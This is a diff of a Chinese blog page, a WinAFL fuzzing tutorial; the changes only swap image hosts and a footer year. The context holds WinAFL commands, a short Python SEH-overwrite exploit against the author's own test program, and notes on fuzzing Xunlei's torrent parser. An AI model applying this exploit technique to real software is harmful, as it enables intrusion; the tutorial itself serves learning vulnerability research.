@@ -23,22 +23,22 @@
 <p>开始fuzz</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe ^</span><br><span class="line">-i .\in ^</span><br><span class="line">-o .\out ^</span><br><span class="line">-D &quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32&quot; ^</span><br><span class="line">-I 100000+ -t 90000+ -- ^</span><br><span class="line">-coverage_module mydll.dll ^</span><br><span class="line">-target_module main.exe ^</span><br><span class="line">-target_offset 0x16B0 ^</span><br><span class="line">-fuzz_iterations 5000 -nargs 2 -- ^</span><br><span class="line">main.exe @@</span><br></pre></td></tr></table></figure>
 <p>瞬间找到crash</p>
-<p><img src="https://img.joe1sn.top/uploads/big/daaf8adb1d017be8d9a2cfe663b3e31e.png" alt="image-20230719223344759" /></p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/daaf8adb1d017be8d9a2cfe663b3e31e.png" alt="image-20230719223344759" /></p>
 <p>样本长这样</p>
-<p><img src="https://img.joe1sn.top/uploads/big/54e297bf0dc0db9abedc7f7a9dde0eb7.png" alt="image-20230719223644693" /></p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/54e297bf0dc0db9abedc7f7a9dde0eb7.png" alt="image-20230719223644693" /></p>
 <p>这次尝试使用x32dbg分析</p>
-<p><img src="https://img.joe1sn.top/uploads/big/d7671aece307bb7bea07693d3ee10c34.png" alt="image-20230719223859881" /></p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/d7671aece307bb7bea07693d3ee10c34.png" alt="image-20230719223859881" /></p>
 <p>得到EXP</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="string">b&quot;A&quot;</span>*(<span class="number">0x12c</span>-<span class="built_in">len</span>(shellcode)-<span class="number">32</span>) <span class="comment">#0x1c</span></span><br><span class="line">NSEH = <span class="string">b&quot;\xeb\x06\x90\x90&quot;</span>      <span class="comment">#asm(&quot;jmp 6;nop;nop&quot;)</span></span><br><span class="line">gadget = <span class="string">b&quot;\xEA\x23\x40\x00&quot;</span>    <span class="comment">#004023EA</span></span><br><span class="line">self_gadget = <span class="string">b&quot;\x89\xE0\x05\x24\x06\x00\x00\xFF\xE0&quot;</span>	<span class="comment"># mov eax, esp</span></span><br><span class="line">                                                        <span class="comment"># sub eax, 0x608</span></span><br><span class="line">                                                        <span class="comment"># jmp eax</span></span><br><span class="line">payload = <span class="string">b&quot;\xaa&quot;</span>*<span class="number">32</span>+shellcode+offset+NSEH+gadget+self_gadget</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.joe1sn.top/uploads/big/2b31205d967b4cbe010d72e2fa611249.png" alt="image-20230719224736838" /></p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/2b31205d967b4cbe010d72e2fa611249.png" alt="image-20230719224736838" /></p>
 <p>要点就是：<strong>Fuzz的时候和插桩的时候加上<code>-coverage_module &lt;你的dll&gt;</code></strong></p>
 <h2 id="实际测试"><a class="markdownIt-Anchor" href="#实际测试"></a> 实际测试</h2>
 <p>你已经学会了1+1=2，请证明费马大定理吧，为了统一和方便，这里也用看雪里面的一篇文章</p>
 <p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-265958.htm">使用winafl对迅雷的torrent解析逻辑进行fuzz </a></p>
 <p>首先是找到合适的软件，然后知道他那个功能是在那个dll中的，你可以使用<code>ProcessMonitor</code>查看（俗称<code>procmon</code>），截图没有，特征就是当你打开一个<code>.torrent</code>文件后，<code>thunder.exe</code>会马上加载<code>AssisstantTools.dll</code>。通过查看导出表可以找到一些可以测试的函数，这里我测试的是<code>XL_ParseTorrentFile</code></p>
-<img src="https://img.joe1sn.top/uploads/big/445b9aecbc3b84a5f61ac18ff7ca2b78.png" alt="image-20230721110915736" style="zoom:50%;" />
+<img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/445b9aecbc3b84a5f61ac18ff7ca2b78.png" alt="image-20230721110915736" style="zoom:50%;" />
 <p>查看导入表可以看到依赖的<code>P2PBase.dll</code></p>
-<img src="https://img.joe1sn.top/uploads/big/ee4fca4ffb70d73f4b43d937125d366a.png" alt="image-20230721111002412" style="zoom:50%;" />
+<img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/ee4fca4ffb70d73f4b43d937125d366a.png" alt="image-20230721111002412" style="zoom:50%;" />
 <p>所以fuzz的时候也要加上，开始编写harness，你可以用那篇文章里面的，但是我这里就很慢，<br />
 原文文章中的harness由于<code>using</code>附近的代码只在<code>c++11</code>中支持，所以使用gcc编译报错的可以尝试加上<code>-std=c++11</code><br />
 如果你使用的是下面我编写的harness，那么直接编译就可以了</p>
@@ -49,7 +49,7 @@
 <li>
 <p><strong>问题1：</strong></p>
 <p>如果你使用的<code>Dynamorio</code>是大于 <strong>8.0.0-1</strong>版本的，很大概率会出现错误类似于下面</p>
-<img src="https://img.joe1sn.top/uploads/big/8be39e57103291b9933c16e1a6e5938e.png" alt="image-20230721111548243" style="zoom: 50%;" />
+<img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/8be39e57103291b9933c16e1a6e5938e.png" alt="image-20230721111548243" style="zoom: 50%;" />
 <p>这种情况就是生成覆盖率文件是对的，但是测试的时候当程序进行IAT导入的时候，在<code>dynamorio</code>中的harness崩溃了，所以程序还没有进入<code>entry</code>入口点函数就直接寄了。这个错误很有意思，加载类似<code>ntdll.dll</code>或者自己在windows上写的DLL（哪怕无符号）都可以，当harness中的<code>LoadLibrary</code>载入其他DLL的时候（比如某个软件的<code>ffmpeg.dll</code>）也会报错。<br />
 这个问题我解决了一天也没有解决，到是在看雪找了一个和我一样的帖子</p>
 <p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-274169.htm">https://bbs.kanxue.com/thread-274169.htm</a></p>
@@ -58,7 +58,7 @@
 <li>
 <p><strong>问题2：</strong></p>
 <p>当你使用<code>target_method</code>的时候，程序找不到该方法，这在你进行测试winafl案例的时候很常见，原因是该方法没有进行导出，在函数前面加上<code>extern &quot;C&quot; __declspec(dllexport)</code>就行了</p>
-<img src="https://img.joe1sn.top/uploads/big/9445f402596260b4ace1ac70c24f489b.png" alt="image-20230721112432715" style="zoom:50%;" />
+<img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/9445f402596260b4ace1ac70c24f489b.png" alt="image-20230721112432715" style="zoom:50%;" />
 </li>
 </ul>
 <p>首先就是缩减testcase</p>
@@ -74,9 +74,9 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe ^</span><br><span class="line">-M master ^</span><br><span class="line">-i -&quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\thunder_fuzzer\in&quot; ^</span><br><span class="line">-o &quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\thunder_fuzzer\out&quot; ^</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
-<p><img src="https://img.joe1sn.top/uploads/big/f8eda3779cf4f5a853f8a2e4370b3dfb.png" alt="img" /></p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/f8eda3779cf4f5a853f8a2e4370b3dfb.png" alt="img" /></p>
 <p>自己改写的harness确实快，但也不至于一下子就跑出来，这里我用旧版本的迅雷试了下</p>
-<img src="https://img.joe1sn.top/uploads/big/964c55b0c61c8d59db09b4b65d3deabb.png" alt="img" style="zoom:67%;" />
+<img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/964c55b0c61c8d59db09b4b65d3deabb.png" alt="img" style="zoom:67%;" />
 <p>也就是一个被修复的÷0报错（EXCEPTION_INT_DIVIDE_BY_ZERO）</p>
 <p>昨天16h高强度修复问题1，暂时更新到这里</p>
 </div></article><section class="comments"><div id="disqus_thread"></div><script>var disqus_shortname = 'disqus';
@@ -86,4 +86,4 @@
   dsq.async = true;
   dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
   (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-})();</script><script id="dsq-count-scr" src="//#{theme.disqus}.disqus.com/count.js" async></script></section><div class="pagination"><a class="pagination__link pagination__prev" href="/2023/07/22/afl-source/">prev_post</a><a class="pagination__link pagination__next" href="/2023/07/18/win-afl/">next_post</a></div></main><footer class="footer metadata"><p class="footer__text">© 2024 Joe1sn</p><p class="footer__text">Powered by <a class="footer__text__link" href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a class="footer__text__link" href="https://pages.github.com/" target="_blank">Github Page</a></p></footer></div></body></html>
+})();</script><script id="dsq-count-scr" src="//#{theme.disqus}.disqus.com/count.js" async></script></section><div class="pagination"><a class="pagination__link pagination__prev" href="/2023/07/22/afl-source/">prev_post</a><a class="pagination__link pagination__next" href="/2023/07/18/win-afl/">next_post</a></div></main><footer class="footer metadata"><p class="footer__text">© 2025 Joe1sn</p><p class="footer__text">Powered by <a class="footer__text__link" href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a class="footer__text__link" href="https://pages.github.com/" target="_blank">Github Page</a></p></footer></div></body></html>
